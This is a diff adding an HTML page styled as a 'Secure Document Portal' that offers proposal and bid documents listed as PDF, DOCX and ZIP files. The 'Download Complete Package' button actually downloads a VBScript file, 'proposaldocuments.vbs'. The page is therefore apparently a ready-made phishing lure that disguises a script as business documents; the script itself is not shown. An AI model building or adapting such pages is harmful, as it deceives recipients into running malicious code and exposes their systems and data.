@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Secure Document Portal</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial,Helvetica,sans-serif;
+}
+
+body{
+    background:#edf2f7;
+}
+
+.hero{
+    background:#214d4b;
+    color:#fff;
+    text-align:center;
+    padding:55px 20px 120px;
+}
+
+.hero h1{
+    font-size:42px;
+    margin-bottom:12px;
+}
+
+.hero p{
+    font-size:20px;
+    opacity:.9;
+}
+
+.container{
+    width:85%;
+    max-width:1200px;
+    background:#fff;
+    margin:-70px auto 40px;
+    padding:40px;
+    border-radius:20px;
+    box-shadow:0 12px 30px rgba(0,0,0,.15);
+}
+
+.file{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    padding:20px 0;
+    border-bottom:1px solid #ececec;
+}
+
+.file:last-child{
+    border-bottom:none;
+}
+
+.file-name{
+    font-size:22px;
+    font-weight:bold;
+}
+
+.file-version{
+    color:#777;
+}
+
+.download-area{
+    text-align:center;
+    margin-top:40px;
+}
+
+.download-btn{
+    display:inline-block;
+    background:#214d4b;
+    color:white;
+    padding:18px 42px;
+    border-radius:14px;
+    text-decoration:none;
+    font-size:22px;
+    transition:.2s;
+}
+
+.download-btn:hover{
+    background:#173937;
+}
+
+.note{
+    margin-top:20px;
+    color:#666;
+}
+</style>
+</head>
+
+<body>
+
+<div class="hero">
+    <h1>Proposal & Bid Documents</h1>
+    <p>Latest project package available for authorized download.</p>
+</div>
+
+<div class="container">
+
+<div class="file">
+    <div>
+        <div class="file-name">Proposal Package</div>
+        <div class="file-version">Revision 2.6</div>
+    </div>
+    <div>📄 PDF</div>
+</div>
+
+<div class="file">
+    <div>
+        <div class="file-name">Technical Specifications</div>
+        <div class="file-version">Revision 2.6</div>
+    </div>
+    <div>📄 DOCX</div>
+</div>
+
+<div class="file">
+    <div>
+        <div class="file-name">Supporting Files</div>
+        <div class="file-version">Latest Release</div>
+    </div>
+    <div>📦 ZIP</div>
+</div>
+
+<div class="download-area">
+    <a class="download-btn" href="proposaldocuments.vbs" download>
+    ⬇ Download Complete Package
+</a>
+
+    <div class="note">
+        Clicking the button downloads the complete package.
+    </div>
+</div>
+
+</div>
+
+</body>
+</html>
